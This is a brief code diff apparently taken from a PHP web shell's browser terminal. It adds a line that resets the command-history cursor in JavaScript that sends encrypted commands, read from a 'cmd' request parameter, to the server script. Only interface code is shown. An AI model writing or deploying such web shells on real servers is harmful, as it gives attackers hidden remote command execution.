@@ -389,6 +389,7 @@ if (isset($_REQUEST['cmd'])) {
                     return;
                 }
                 this.history.push(command);
+                this.history_cursor = null;
                 $('#stdout').append($('#pwd').html() + " " + command + "\n");
                 var that = this;
                 $.post(this.script_path, {cmd: this.encrypt(command)}, function(data) {
